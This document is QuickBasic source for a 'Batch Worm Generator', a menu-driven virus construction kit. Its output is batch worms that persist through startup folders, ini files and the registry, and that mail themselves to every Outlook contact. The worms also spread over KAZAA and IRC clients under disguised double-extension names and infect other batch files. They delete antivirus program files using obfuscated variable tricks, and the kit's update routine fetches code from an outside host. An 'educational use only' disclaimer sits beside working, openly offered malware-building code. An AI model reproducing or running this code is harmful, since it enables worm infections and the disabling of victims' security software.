headline:
CLS
REM SeCoNd PaRt To HeLl's
REM BATCH WORM GENERATOR 5.03
name$ = "BATCH WORM GENERATOR 5.03"
RANDOMIZE TIMER
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 7
PRINT " WRITE WORM (1)"
PRINT " INFORMATION (2)"
PRINT " THANKS AND GREETS (3)"
PRINT " INTERNET UPDATE (4)"
PRINT " END (5)"
PRINT ""
INPUT " Please choose: ", beginn
IF beginn = 1 THEN GOTO VIRUSERSTELLEN
IF beginn = 2 THEN GOTO INFORMATION
IF beginn = 3 THEN GOTO TAG
IF beginn = 4 THEN GOTO update
IF beginn = 5 THEN GOTO Ende
GOTO headline
INFORMATION:
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 7
PRINT "                     Information about the Batch Worm Generator"
PRINT ""
PRINT " First I have to say, that spreading a computervirus is illegal in most"
PRINT " countries and this program is provided here for educational use only."
PRINT " I will not be held responsible for any damage done to your own "
PRINT " personal machine or 3rd party. "
PRINT ""
COLOR 2
PRINT " Now something else:"
COLOR 7
PRINT " I haven't built any harmful functions in this program, because I don't want to"
PRINT " encourage destructive payloads, viruswriters should be creative at this point ..."
PRINT ""
INPUT " press enter...", nix$
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 7
PRINT " IMPORTANT: If the program causes any problems, "
PRINT " or the program made a buggy worm, or if you have any suggestion"
PRINT " to improve this program, please write me a mail to:"
COLOR 2
PRINT " SPTH@jet2web.cc"
COLOR 7
PRINT ""
PRINT " I try to fix the bugs as fast as i can, and upload the program to this site:"
COLOR 2
PRINT " http://www.spth.de.vu"
COLOR 7
PRINT ""
PRINT " greets,"
PRINT ""
PRINT " SeCoNd PaRt To HeLl"
PRINT ""
INPUT " press enter...", nix$
GOTO headline
update:
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 4
PRINT " INTERNET UPDATE:"
COLOR 7
PRINT ""
INPUT " Press ENTER for upgrading to a new version of BWG... ", nix$
OPEN "update.vbs" FOR OUTPUT AS #2
PRINT #2, "CreateObject("; CHR$(34); "WScript.Shell"; CHR$(34); ").run "; CHR$(34); "http://www16.brinkster.com/herrlich/newver.zip"; CHR$(34); ",3,false"
CLOSE #2
SHELL "cscript update.vbs"
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 4
PRINT " INTERNET UPDATE:"
COLOR 7
PRINT ""
PRINT " The new program was downloaded."
PRINT " Extract the file newver.zip and you can use a new version of BWG."
INPUT " press ENTER...", nix$
KILL "update.vbs"
GOTO headline
TAG:
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 4
PRINT " Thanks:"
COLOR 7
PRINT
PRINT " SnakeByte ->> for his QuickBasic-Help [http://www.kryptocrew.de/snakebyte]"
PRINT " VorteX    ->> for his nice suggestions to improve the BWG and Batch virii!"
PRINT " Worf      ->> for his Batch virii, PHP virii and REG virii"
PRINT " Positron  ->> for his Batch virii and BWG help!"
PRINT " Black Cat ->> Put the BWG at his HomePage [http://hvx.cjb.net]"
PRINT " Dr. T     ->> Upload the BWG at his HomePage [http://www.ebcvg.com]"
INPUT " press enter... ", nix$
GOTO headline
VIRUSERSTELLEN:
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 7
INPUT " Name of the worm: ", virname$
INPUT " Name of the Author: ", virautor$
IF virautor$ = "SPTH" THEN GOTO SPTHVir
IF virautor$ = "spth" THEN GOTO SPTHVir
IF virautor$ = "SeCoNd PaRt To HeLl" THEN GOTO SPTHVir
GOTO SPTHVirEnd
SPTHVir:
COLOR 5
PRINT " Are you crazy??"
COLOR 7
SPTHVirEnd:
INPUT " The main-filename of the virus (file.BAT): ", MyS$
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 4
PRINT " Activation of the worm:"
COLOR 7
DeuAutoSt = 0
INPUT " Shall the worm copy to the german start-upfolder (Y/N): ", akt$
IF akt$ = "Y" THEN DeuAutoSt = 1
IF akt$ = "y" THEN DeuAutoSt = 1
EngAutoSt = 0
INPUT " Shall the worm copy to the english start-upfolder (Y/N): ", eas$
IF eas$ = "Y" THEN EngAutoSt = 1
IF eas$ = "y" THEN EngAutoSt = 1
WinINI = 0
INPUT " Shall the worm activate itself with the win.ini (Y/N): ", wini$
IF wini$ = "Y" THEN WinINI = 1
IF wini$ = "y" THEN WinINI = 1
SysINI = 0
INPUT " Shall the worm activate itself with the system.ini (Y/N): ", ssini$
IF ssini$ = "Y" THEN SysINI = 1
IF ssini$ = "y" THEN SysINI = 1
regkey = 0
INPUT " Shall the worm write itself to a registry key (Y/N): ", rek$
IF rek$ = "Y" THEN regkey = 1
IF rek$ = "y" THEN regkey = 1
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 7
COLOR 4
PRINT " Internet Spreading:"
COLOR 7
Outlook = 0
INPUT " Shall the worm spread with MS-Outlook (Y/N): ", msol$
IF msol$ = "Y" THEN Outlook = 1
IF msol$ = "y" THEN Outlook = 1
IF Outlook = 1 THEN GOTO AuswahlOL
GOTO AuswahlOLEnd
AuswahlOL:
INPUT " --> Which subject: ", OLSubject$
INPUT " --> Which body: ", OLBody$
INPUT " --> Which attachment (pics.BAT): ", OLAttachment$
AuswahlOLEnd:
kazza = 0
INPUT " Shall the worm spread with KAZAA (Y/N): ", KazzaI$
IF KazzaI$ = "Y" THEN kazza = 1
IF KazzaI$ = "y" THEN kazza = 1
IF kazza = 1 THEN GOTO Auswahlkazza
GOTO AuswahlkazzaEnd
Auswahlkazza:
INPUT " --> Which (music-)filename (sound.mp3.BAT): ", kazzaattachment$
AuswahlkazzaEnd:

mIRC = 0
INPUT " Shall the worm spread with mIRC (Y/N): ", IRC$
IF IRC$ = "Y" THEN mIRC = 1
IF IRC$ = "y" THEN mIRC = 1
IF mIRC = 1 THEN GOTO AuswahlmIRC
GOTO AuswahlmIRCEnd
AuswahlmIRC:
INPUT " --> Which filename (funny.jpg.BAT): ", mIRCAttachment$
AuswahlmIRCEnd:
pirchb = 0
INPUT " Shall the worm spread with pIRCh (Y/N): ", pircha$
IF pircha$ = "Y" THEN pirchb = 1
IF pircha$ = "y" THEN pirchb = 1
IF pirchb = 0 THEN GOTO AuswahlpIRChEnd
AuswahlpIRCh:
INPUT " --> Which name of the file (lala.arv.BAT): ", pIRChAttachment$
AuswahlpIRChEnd:
vircB = 0
INPUT " Shall the worm spread with Virc (Y/N): ", virca$
IF virca$ = "Y" THEN vircB = 1
IF virca$ = "y" THEN vircB = 1
IF vircB = 0 THEN GOTO AuswahlVircEnd
AuswahlVirc:
INPUT " --> Which name of the file (love-me.bat): ", vircattachment$
AuswahlVircEnd:

CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
 
COLOR 4
PRINT " Spreading inside a PC:"
COLOR 7
BatInfektionen:
INPUT " Shall the worm infect all .BAT files (Y/N): ", BIF$
BatDateienInf = 0
IF BIF$ = "Y" THEN BatDateienInf = 1
IF BIF$ = "y" THEN BatDateienInf = 1
BatInfektionenEnd:
INPUT " Shall the worm infect Windows-root (Y/N): ", WD$
windir = 0
IF WD$ = "Y" THEN windir = 1
IF WD$ = "y" THEN windir = 1
INPUT " Shall the worm copy onto the Desktop (Y/N): ", desk$
Desktop = 0
IF desk$ = "Y" THEN Desktop = 1
IF desk$ = "y" THEN Desktop = 1
INPUT " Shall the worm copy to a Disk (Y/N): ", Adisk$
Diskette = 0
IF Adisk$ = "Y" THEN Diskette = 1
IF Adisk$ = "y" THEN Diskette = 1
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 4
PRINT " File dropping:"
COLOR 7
RegFileI = 0
INPUT " Shall the worm drop to REG files (Y/N): ", RegFileInfection$
IF RegFileInfection$ = "Y" THEN RegFileI = 1
IF RegFileInfection$ = "y" THEN RegFileI = 1
VBSFileI = 0
INPUT " Shall the worm drop to VBS files (Y/N): ", VBSFileInfection$
IF VBSFileInfection$ = "Y" THEN VBSFileI = 1
IF VBSFileInfection$ = "y" THEN VBSFileI = 1
JSFileI = 0
INPUT " Shall the worm drop to JS files (Y/N): ", JSFileInfection$
IF JSFileInfection$ = "Y" THEN JSFileI = 1
IF JSFileInfection$ = "y" THEN JSFileI = 1
IF JSFileI = 0 THEN GOTO JsNoInf
OPEN "JS.BWG" FOR OUTPUT AS #3
PRINT #3, "JS"
CLOSE #3
GOTO JsEndFileInf
JsNoInf:
OPEN "JS.BWG" FOR OUTPUT AS #3
PRINT #3, "NS"
CLOSE #3
JsEndFileInf:
PifFileI = 0
INPUT " Shall the worm drop to PIF files (Y/N): ", PIFFileInfection$
IF PIFFileInfection$ = "Y" THEN PifFileI = 1
IF PIFFileInfection$ = "y" THEN PifFileI = 1
LnkFileI = 0
INPUT " Shall the worm drop to LNK files (Y/N): ", LnkFileInfection$
IF LnkFileInfection$ = "Y" THEN LnkFileI = 1
IF LnkFileInfection$ = "y" THEN LnkFileI = 1
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 7
COLOR 4
PRINT " Anti AV Techniques:"
COLOR 7
fakeline = 0
INPUT " Shall the worm-code include 1000 Fake Bytes (Y/N): ", fakelinesa$
IF fakelinesa$ = "Y" THEN fakeline = 1
IF fakelinesa$ = "y" THEN fakeline = 1
INPUT " Shall the Worm delete some AV programs (Y/N): ", Dav$
delAV = 0
IF Dav$ = "Y" THEN delAV = 1
IF Dav$ = "y" THEN delAV = 1
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 4
PRINT " Others:"
COLOR 7
poly = 0
REM INPUT " Shall the worm use polymorphism (Y/N): ", ll$
IF ll$ = "Y" THEN poly = 1
IF ll$ = "y" THEN poly = 1
IF poly = 1 THEN OPEN "poly.bwg" FOR OUTPUT AS #3
IF poly = 1 THEN PRINT #3, "P"
IF poly = 1 THEN CLOSE #3
IF poly = 0 THEN OPEN "poly.bwg" FOR OUTPUT AS #3
IF poly = 0 THEN PRINT #3, "N"
IF poly = 0 THEN CLOSE #3
INPUT " Shall the Worm write a message (Y/N): ", massag$
mesg = 0
IF massag$ = "Y" THEN mesg = 1
IF massag$ = "y" THEN mesg = 1
IF mesg = 1 THEN GOTO Wmsg
GOTO WmsgEnd
Wmsg:
INPUT " --> Which message: ", msg$
WmsgEnd:
LogLauf = 0
INPUT " Shall the worm create a logic hard drive (Y/N): ", ll$
IF ll$ = "Y" THEN LogLauf = 1
IF ll$ = "y" THEN LogLauf = 1
UDF = 0
INPUT " Shall the worm copy itself to a undeletable folder (Y/N): ", UDFa$
IF UDFa$ = "Y" THEN UDF = 1
IF UDFa$ = "y" THEN UDF = 1
INPUT " Shall the worm include the EICAR-VIRUS-TEST-FILE (Y/N): ", eiTF$
EICAR = 0
IF eiTF$ = "Y" THEN EICAR = 1
IF eiTF$ = "y" THEN EICAR = 1
INPUT " press enter... ", a
MakeWorm:
CLS
COLOR 1
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + +      "; name$; "        + + + + "
PRINT "             + + + +                                       + + + + "
PRINT "             + + + + + + + + + + + + + + + + + + + + + + + + + + + "
PRINT ""
COLOR 7
OPEN "worm.txt" FOR OUTPUT AS #1
AA$ = ""
BB$ = ""
CC$ = ""
DD$ = ""
EE$ = ""
REM IF poly = 1 THEN AA$ = "%AAAA%"
REM IF poly = 1 THEN BB$ = "%BBBB%"
REM IF poly = 1 THEN CC$ = "%CCCC%"
REM IF poly = 1 THEN DD$ = "%DDDD%"
REM IF poly = 1 THEN EE$ = "%EEEE%"
IF EICAR = 1 THEN GOTO EICARIN
GOTO EICARINE
EICARIN:
PRINT #1, "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"; AA$
PRINT #1, "cls"; AA$
EICARINE:
PRINT #1, "@echo off"; AA$
PRINT #1, "REM Name: "; virname$; AA$
PRINT #1, "REM Author: "; virautor$; AA$
PRINT #1, "REM generated with "; name$; AA$
PRINT #1, "ctty nul"; AA$
IF fakeline = 1 THEN GOTO FakeLineB
GOTO FakeLineBEnde
FakeLineB:
FLD = 0
FLDA:
FLC = 0
DO WHILE FLC <= 100
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
B$ = B$ + a$
FLC = FLC + 1
LOOP
FLC = 0
B$ = B$ + AA$
PRINT #1, B$
B$ = ""
FLD = FLD + 1
IF FLD <= 10 THEN GOTO FLDA
FakeLineBEnde:
IF delAV = 1 THEN GOTO AVD
GOTO AVDEnd
AVD:
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set A=p"
IF rand = 1 THEN delavA$ = "%A%ro"
IF rand = 2 THEN PRINT #1, ""; AA$; "set A=r"
IF rand = 2 THEN delavA$ = "p%A%o"
IF rand = 3 THEN PRINT #1, ""; AA$; "set A=o"
IF rand = 3 THEN delavA$ = "pr%A%"
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set B=g"
IF rand = 1 THEN delavB$ = "%B%ra"
IF rand = 2 THEN PRINT #1, ""; AA$; "set B=r"
IF rand = 2 THEN delavB$ = "g%B%a"
IF rand = 3 THEN PRINT #1, ""; AA$; "set B=a"
IF rand = 3 THEN delavB$ = "gr%B%"
delAV$ = delavA$ + delavB$
PRINT #1, "del C:\"; delAV$; "~1\kasper~1\avp32.exe"; AA$
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set A=p"
IF rand = 1 THEN delavA$ = "%A%ro"
IF rand = 2 THEN PRINT #1, ""; AA$; "set A=r"
IF rand = 2 THEN delavA$ = "p%A%o"
IF rand = 3 THEN PRINT #1, ""; AA$; "set A=o"
IF rand = 3 THEN delavA$ = "pr%A%"
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set B=g"
IF rand = 1 THEN delavB$ = "%B%ra"
IF rand = 2 THEN PRINT #1, ""; AA$; "set B=r"
IF rand = 2 THEN delavB$ = "g%B%a"
IF rand = 3 THEN PRINT #1, ""; AA$; "set B=a"
IF rand = 3 THEN delavB$ = "gr%B%"
delAV$ = delavA$ + delavB$
PRINT #1, "del C:\"; delAV$; "~1\norton~1\*.exe"; AA$
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set A=p"
IF rand = 1 THEN delavA$ = "%A%ro"
IF rand = 2 THEN PRINT #1, ""; AA$; "set A=r"
IF rand = 2 THEN delavA$ = "p%A%o"
IF rand = 3 THEN PRINT #1, ""; AA$; "set A=o"
IF rand = 3 THEN delavA$ = "pr%A%"
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set B=g"
IF rand = 1 THEN delavB$ = "%B%ra"
IF rand = 2 THEN PRINT #1, ""; AA$; "set B=r"
IF rand = 2 THEN delavB$ = "g%B%a"
IF rand = 3 THEN PRINT #1, ""; AA$; "set B=a"
IF rand = 3 THEN delavB$ = "gr%B%"
delAV$ = delavA$ + delavB$
PRINT #1, "del C:\"; delAV$; "~1\trojan~1\tc.exe"; AA$
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set A=p"
IF rand = 1 THEN delavA$ = "%A%ro"
IF rand = 2 THEN PRINT #1, ""; AA$; "set A=r"
IF rand = 2 THEN delavA$ = "p%A%o"
IF rand = 3 THEN PRINT #1, ""; AA$; "set A=o"
IF rand = 3 THEN delavA$ = "pr%A%"
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set B=g"
IF rand = 1 THEN delavB$ = "%B%ra"
IF rand = 2 THEN PRINT #1, ""; AA$; "set B=r"
IF rand = 2 THEN delavB$ = "g%B%a"
IF rand = 3 THEN PRINT #1, ""; AA$; "set B=a"
IF rand = 3 THEN delavB$ = "gr%B%"
delAV$ = delavA$ + delavB$ + "~1"
PRINT #1, "del C:\"; delAV$; "\norton~1\s32integ.dll"; AA$
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set A=p"
IF rand = 1 THEN delavA$ = "%A%ro"
IF rand = 2 THEN PRINT #1, ""; AA$; "set A=r"
IF rand = 2 THEN delavA$ = "p%A%o"
IF rand = 3 THEN PRINT #1, ""; AA$; "set A=o"
IF rand = 3 THEN delavA$ = "pr%A%"
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set B=g"
IF rand = 1 THEN delavB$ = "%B%ra"
IF rand = 2 THEN PRINT #1, ""; AA$; "set B=r"
IF rand = 2 THEN delavB$ = "g%B%a"
IF rand = 3 THEN PRINT #1, ""; AA$; "set B=a"
IF rand = 3 THEN delavB$ = "gr%B%"
delAV$ = delavA$ + delavB$
PRINT #1, "del C:\"; delAV$; "\f-prot95\fpwm32.dll"; AA$
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set A=p"
IF rand = 1 THEN delavA$ = "%A%ro"
IF rand = 2 THEN PRINT #1, ""; AA$; "set A=r"
IF rand = 2 THEN delavA$ = "p%A%o"
IF rand = 3 THEN PRINT #1, ""; AA$; "set A=o"
IF rand = 3 THEN delavA$ = "pr%A%"
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set B=g"
IF rand = 1 THEN delavB$ = "%B%ra"
IF rand = 2 THEN PRINT #1, ""; AA$; "set B=r"
IF rand = 2 THEN delavB$ = "g%B%a"
IF rand = 3 THEN PRINT #1, ""; AA$; "set B=a"
IF rand = 3 THEN delavB$ = "gr%B%"
delAV$ = delavA$ + delavB$
PRINT #1, "del C:\"; delAV$; "~1\mcafee\scan.dat"
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set A=p"
IF rand = 1 THEN delavA$ = "%A%ro"
IF rand = 2 THEN PRINT #1, ""; AA$; "set A=r"
IF rand = 2 THEN delavA$ = "p%A%o"
IF rand = 3 THEN PRINT #1, ""; AA$; "set A=o"
IF rand = 3 THEN delavA$ = "pr%A%"
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set B=g"
IF rand = 1 THEN delavB$ = "%B%ra"
IF rand = 2 THEN PRINT #1, ""; AA$; "set B=r"
IF rand = 2 THEN delavB$ = "g%B%a"
IF rand = 3 THEN PRINT #1, ""; AA$; "set B=a"
IF rand = 3 THEN delavB$ = "gr%B%"
delAV$ = delavA$ + delavB$
PRINT #1, ""; AA$; "set avC=tbav"
PRINT #1, "goto delavri"; AA$
PRINT #1, ""; AA$; "set avC=ocem"
PRINT #1, ":delavri"; AA$
PRINT #1, "del C:\"; delAV$; "~1\%avC%\tbav.dat"; AA$
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set A=p"
IF rand = 1 THEN delavA$ = "%A%ro"
IF rand = 2 THEN PRINT #1, ""; AA$; "set A=r"
IF rand = 2 THEN delavA$ = "p%A%o"
IF rand = 3 THEN PRINT #1, ""; AA$; "set A=o"
IF rand = 3 THEN delavA$ = "pr%A%"
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set B=g"
IF rand = 1 THEN delavB$ = "%B%ra"
IF rand = 2 THEN PRINT #1, ""; AA$; "set B=r"
IF rand = 2 THEN delavB$ = "g%B%a"
IF rand = 3 THEN PRINT #1, ""; AA$; "set B=a"
IF rand = 3 THEN delavB$ = "gr%B%"
delAV$ = delavA$ + delavB$
PRINT #1, "del C:\"; delAV$; "~1\avpersonal\antivir.vdf"
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set A=t"
IF rand = 1 THEN delavA$ = "%A%ba"
IF rand = 2 THEN PRINT #1, ""; AA$; "set A=b"
IF rand = 2 THEN delavA$ = "t%A%a"
IF rand = 3 THEN PRINT #1, ""; AA$; "set A=a"
IF rand = 3 THEN delavA$ = "tb%A%"
rand = INT(RND * 2) + 1
IF rand = 1 THEN PRINT #1, ""; AA$; "set B=v"
IF rand = 1 THEN delavB$ = "%B%w"
IF rand = 2 THEN PRINT #1, ""; AA$; "set B=w"
IF rand = 2 THEN delavB$ = "v%B%"
delAV$ = delavA$ + delavB$ + "95"
PRINT #1, "del C:\"; delAV$; "\tbscan.sig"; AA$
AVDEnd:
PRINT #1, "set a=s"; AA$
PRINT #1, "set b=e"; AA$
PRINT #1, "set c=t"; AA$
PRINT #1, ""; AA$; "%a%%b%%c% MyS=%0"
IF poly = 1 THEN AA$ = " %AAAA%"
PRINT #1, "copy %MyS% "; MyS$; AA$
PRINT #1, ""; AA$; "%a%%b%%c% MyS="; MyS$
IF poly = 1 THEN CLOSE #1
IF poly = 1 THEN SHELL "poly.exe"
IF poly = 1 THEN OPEN "worm.txt" FOR APPEND AS #1
PRINT #1, "copy my.bat "; MyS$; AA$
PRINT #1, "del my.bat "; AA$
CLOSE #1
SHELL "include.exe"
OPEN "worm.txt" FOR APPEND AS #1
IF Outlook = 1 THEN GOTO ol
GOTO OLend
ol:
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
fina$ = a$ + B$ + c$ + d$ + e$ + ".vbs"
PRINT #1, "copy "; MyS$; " C:\"; OLAttachment$; CC$
PRINT #1, "copy "; MyS$; " C:\"; fina$; CC$
vbswayp = INT(RND * 1) + 1
IF vbswayp = 1 THEN GOTO VBSwaya
IF vbswayp = 2 THEN GOTO vbswayb
VBSwaya:
mp = INT(RND * 2) + 1
IF mp = 1 THEN PRINT #1, "echo Dim x > C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayF=dim"
IF mp = 2 THEN PRINT #1, "echo %VBSwayF% x > C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayF="
mp = INT(RND * 2) + 1
IF mp = 1 THEN PRINT #1, "echo.on error resume next >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayA=resume"
IF mp = 2 THEN PRINT #1, "echo.on error %VBSwayA% next >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayA="
mp = INT(RND * 2) + 1
IF mp = 1 THEN PRINT #1, "echo Set fso ="; CHR$(34); " Scripting.FileSystem.Object"; CHR$(34); " >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayG=FileSystem"
IF mp = 2 THEN PRINT #1, "echo Set fso ="; CHR$(34); " Scripting.%VBSwayG%.Object"; CHR$(34); " >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayG="
mp = INT(RND * 1) + 1
rand = INT(RND * 3) + 1
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
fsore$ = a$ + B$
PRINT #1, "set vbsosf="; fsore$; CC$
IF rand = 1 THEN PRINT #1, ""; CC$; "set vbsosf=f"
IF rand = 1 THEN fso$ = "%vbsosf%so"
IF rand = 2 THEN PRINT #1, ""; CC$; "set vbsosf=s"
IF rand = 2 THEN fso$ = "f%vbsosf%o"
IF rand = 3 THEN PRINT #1, ""; CC$; "set vbsosf=o"
IF rand = 3 THEN fso$ = "fs%vbsosf%"
IF mp = 1 THEN PRINT #1, "echo Set so=CreateObject("; fso$; ") >> C:\"; fina$; CC$
PRINT #1, ""; CC$; "set vbsosf="
mp = INT(RND * 2) + 1
IF mp = 1 THEN PRINT #1, "echo Set ol=CreateObject("; CHR$(34); "Outlook.Application"; CHR$(34); ") >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayI=Outlook"
IF mp = 2 THEN PRINT #1, "echo Set ol=CreateObject("; CHR$(34); "%VBSwayI%.Application"; CHR$(34); ") >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayI="
mp = INT(RND * 2) + 1
IF mp = 1 THEN PRINT #1, "echo Set out= WScript.CreateObject("; CHR$(34); "Outlook.Application"; CHR$(34); ") >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayJ=WScript"
IF mp = 2 THEN PRINT #1, "echo Set out=%VBSwayJ%.CreateObject("; CHR$(34); "Outlook.Application"; CHR$(34); ") >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayJ="
mp = INT(RND * 2) + 1
IF mp = 1 THEN PRINT #1, "echo Set mapi = out.GetNameSpace("; CHR$(34); "MAPI"; CHR$(34); ") >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayD=out"
IF mp = 2 THEN PRINT #1, "echo Set mapi = %VBSwayD%.GetNameSpace("; CHR$(34); "MAPI"; CHR$(34); ") >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayD="
mp = INT(RND * 2) + 1
IF mp = 1 THEN PRINT #1, "echo Set a = mapi.AddressLists(1) >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayN=Lists"
IF mp = 2 THEN PRINT #1, "echo Set a = mapi.Address%VBSwayN%(1) >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayN="
PRINT #1, "echo Set ae=a.AddressEntries >> C:\"; fina$; CC$
mp = INT(RND * 2) + 1
IF mp = 1 THEN PRINT #1, "echo For x=1 To ae.Count >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayB=Count"
IF mp = 2 THEN PRINT #1, "echo For x=1 To ae.%VBSwayB% >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayB="
mp = INT(RND * 2) + 1
IF mp = 1 THEN PRINT #1, "echo Set Mail=ol.CreateItem(0) >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, "echo Set ci=ol.CreateItem(0) >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, "echo Set Mail=ci >> C:\"; fina$; CC$
mp = INT(RND * 2) + 1
IF mp = 1 THEN PRINT #1, "echo Mail.to=ol.GetNameSpace("; CHR$(34); "MAPI"; CHR$(34); ").AddressLists(1).AddressEntries(x) >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayC=Name"
